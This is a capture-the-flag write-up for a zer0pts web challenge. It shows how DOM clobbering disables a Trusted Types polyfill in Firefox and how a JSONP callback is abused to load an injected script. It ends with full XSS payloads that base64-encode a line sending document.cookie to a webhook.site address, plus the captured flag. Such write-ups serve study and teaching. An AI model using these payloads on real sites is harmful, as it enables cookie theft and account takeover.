@@ -1,0 +1,118 @@
+# CSP + Trusted Types
+CSP blocks script execution except for scripts that have nonce or scripts that are included by trusted scripts. Trusted Types blocks including URLs that contain callback.
+	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-<?= $nonce ?>' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
+
+
+	try {
+        trustedTypes.createPolicy('default', {
+          createHTML(url) {
+            return url.replace(/[<>]/g, '');
+          },
+          createScriptURL(url) {
+            if (url.includes('callback')) {
+              throw new Error('custom callback is unimplemented');
+            }
+
+            return url;
+          }
+        });
+      } catch {
+        if (!trustedTypes.defaultPolicy) {
+          throw new Error('failed to register default policy');
+        }
+      }
+
+
+strict-dynamic is enabled in CSP because of this JSONP.
+	// JSONP
+    const jsonp = (url, callback) => {
+      const s = document.createElement('script');
+
+      if (callback) {
+        s.src = `${url}?callback=${callback}`;
+      } else {
+        s.src = url;
+      }
+
+      document.body.appendChild(s);
+    };
+
+
+As the challenge description and the report page say, the admin uses Firefox to crawl reported URLs. Since Firefox does not yet support Trusted Types natively, polyfill is used to enable Trusted Types.
+	<script src="/js/trustedtypes.build.js" nonce="<?= $nonce ?>" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
+
+
+========================= Solution (official) =========================
+
+# Disable Trusted Types
+
+Line 30 ~ 39 (https://github.com/w3c/webappsec-trusted-types/blob/1404e198bcf8e0c06a0ab00b75081b3fafb37bed/src/polyfill/api_only.js)
+
+
+if window.trustedTypes is defined, polyfill will not define trustedTypes.
+```
+const rootProperty = 'trustedTypes';
+
+  // Convert old window.TrustedTypes to window.trustedTypes.
+  if (window['TrustedTypes'] && typeof window[rootProperty] === 'undefined') {
+    window[rootProperty] = Object.freeze(window['TrustedTypes']);
+  }
+
+  if (typeof window[rootProperty] !== 'undefined') {
+    return;
+  }
+```
+
+By DOM Clobbering as below, you can make trustedTypes as a truthy value (HTMLElement object).
+	"><s id="trustedTypes">test</s>
+However, this is not enough. You need to make trustedTypes.defaultPolicy a truthy value too.
+	Line 87 at index.php
+
+It is also able to do with DOM Clobbering. This time, you need to use another technique. In Firefox, a payload as below will make trustedTypes and defaultPolicy truthy values. With this, you can completely disable Trusted Types in Firefox.
+	<form id="trustedTypes"><input id="defaultPolicy"></form>
+
+# Abusing JSONP and get the flag
+
+JSONP will be called as below. window.callback is given as 2nd parameter, however, it is defined nowhere in the code. Thus, you can overwrite the value with DOM Clobbering again.
+	jsonp('/api.php', window.callback);
+
+The callback will be extracted to template string, so it will be converted to String. The way to make the converted value an arbitrary string is, using a element.
+	if (callback) {
+       s.src = `${url}?callback=${callback}`;
+    }
+
+When you set href attribute of a element to abc:test, the result of converting to String is abc:test as above.
+	```
+	<a href="abc:test" id="link">hoge</a>
+	<script>
+	console.log(link + ''); // => abc:test
+	</script>
+	```
+
+Restriction
+	strlen($callback) < 21
+
+	One of the ways to bypass the restriction is, calling jsonp function again. Since api.php does not restrict you to use symbols, including ', (, and ), you can also control 1st parameter, which is URL to be loaded as JavaScript code.
+
+	Final Payload Template 1
+		theme="><form id="trustedTypes"><input name="defaultPolicy"></form><a href="abc:jsonp(x);//" id="callback"></a><a href="data:text/plain;base64,(Base64 encoded script)" id="x"></a>
+
+	Final Payload Template 2
+		theme="><a id=callback href=a:jsonp(x)><form id=trustedTypes><output id=defaultPolicy><a href="data:text/plain;base64,(b64payload)" id="x"></a>
+
+Report
+	location='https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?'+encodeURIComponent(document.cookie)
+	=> bG9jYXRpb249J2h0dHBzOi8vd2ViaG9vay5zaXRlLzUxNDhkODgwLWZjZmQtNDJkZC1iNTk1LWFmMjNlNDJjM2M0YS8/JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ==
+
+
+	# Final Payload 1
+	theme="><form id="trustedTypes"><input name="defaultPolicy"></form><a href="abc:jsonp(x);//" id="callback"></a><a href="data:text/plain;base64,bG9jYXRpb249J2h0dHBzOi8vd2ViaG9vay5zaXRlLzUxNDhkODgwLWZjZmQtNDJkZC1iNTk1LWFmMjNlNDJjM2M0YS8/JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ==" id="x"></a>
+		flag=zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}
+
+	# Final Payload 2
+	theme="><a id=callback href=a:jsonp(x)><form id=trustedTypes><output id=defaultPolicy><a href="data:text/plain;base64,bG9jYXRpb249J2h0dHBzOi8vd2ViaG9vay5zaXRlLzUxNDhkODgwLWZjZmQtNDJkZC1iNTk1LWFmMjNlNDJjM2M0YS8/JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ==" id="x"></a>
+		flag=zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}
+	
+  
+	
+	
